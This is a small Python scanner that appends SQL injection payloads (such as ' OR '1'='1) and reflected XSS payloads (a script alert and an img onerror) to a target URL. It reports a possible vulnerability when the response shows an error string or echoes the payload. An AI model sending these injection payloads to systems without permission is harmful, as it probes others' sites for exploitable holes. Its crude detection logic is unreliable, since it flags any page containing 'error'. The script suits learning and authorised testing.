import requests

def sql_injection_test(url):
    payloads = [
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' OR 1=1--"
    ]

    print("\n[+] Testing for SQL Injection...")

    for payload in payloads:
        test_url = url + payload
        try:
            response = requests.get(test_url, timeout=5)

            if "sql" in response.text.lower() or "error" in response.text.lower():
                print("[!] Possible SQL Injection vulnerability detected!")
                print("    Payload used:", payload)
                return
        except requests.exceptions.RequestException:
            print("[-] Connection error during SQL Injection test.")
            return

    print("[✓] No SQL Injection vulnerability detected.")


def xss_test(url):
    payloads = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>"
    ]

    print("\n[+] Testing for XSS...")

    for payload in payloads:
        test_url = url + payload
        try:
            response = requests.get(test_url, timeout=5)

            if payload.lower() in response.text.lower():
                print("[!] Possible XSS vulnerability detected!")
                print("    Payload used:", payload)
                return
        except requests.exceptions.RequestException:
            print("[-] Connection error during XSS test.")
            return

    print("[✓] No XSS vulnerability detected.")


if __name__ == "__main__":
    target_url = input("Enter target URL (with parameter): ")
    sql_injection_test(target_url)
    xss_test(target_url)
